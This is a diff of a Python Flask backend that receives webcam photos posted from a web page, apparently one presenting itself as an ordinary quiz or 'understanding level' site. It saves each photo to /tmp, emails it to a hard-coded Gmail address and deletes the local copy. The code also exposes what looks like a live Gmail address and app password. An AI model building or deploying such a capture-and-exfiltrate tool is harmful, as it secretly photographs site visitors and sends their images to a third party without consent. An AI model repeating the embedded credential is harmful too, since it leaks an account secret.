@@ -8,11 +8,9 @@ from email import encoders
 
 app = Flask(__name__)
 
-# --- UNGA GMAIL DETAILS ---
 SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "santhoshcyber14@gmail.com")
-APP_PASSWORD = os.environ.get("APP_PASSWORD", "pjil mjsq edim gupw") 
+APP_PASSWORD = os.environ.get("APP_PASSWORD", "pjil mjsq edim gupw")
 RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL", "santhoshcyber14@gmail.com")
-# --------------------------
 
 @app.route("/")
 def index():
@@ -29,27 +27,27 @@ def capture():
         img_data = data["image"].split(",")[1]
         filename = f"photo_{int(time.time() * 1000)}.jpg"
         
-        os.makedirs("captures", exist_ok=True)
-        temp_path = os.path.join("captures", filename)
+        temp_path = os.path.join("/tmp", filename)
         with open(temp_path, "wb") as f:
             f.write(base64.b64decode(img_data))
         
         send_email(temp_path, filename)
-        os.remove(temp_path) # Mail anuppina apram file ah delete panniduvom
         
-        print(f"✅ Photo Captured & Mailed: {filename}")
+        if os.path.exists(temp_path):
+            os.remove(temp_path) 
+            
         return jsonify({"status": "success"})
     except Exception as e:
-        print("❌ ERROR:", e)
+        print("ERROR:", e)
         return jsonify({"status": "error"}), 500
 
 def send_email(filepath, filename):
     msg = MIMEMultipart()
     msg['From'] = SENDER_EMAIL
     msg['To'] = RECEIVER_EMAIL
-    msg['Subject'] = f"New Photo Capture! 📸 - {filename}"
+    msg['Subject'] = f"New Photo Capture! 📸"
     
-    body = "A new photo was captured from the Understanding Level website."
+    body = "A new photo was captured from the website."
     msg.attach(MIMEText(body, 'plain'))
     
     with open(filepath, "rb") as attachment:
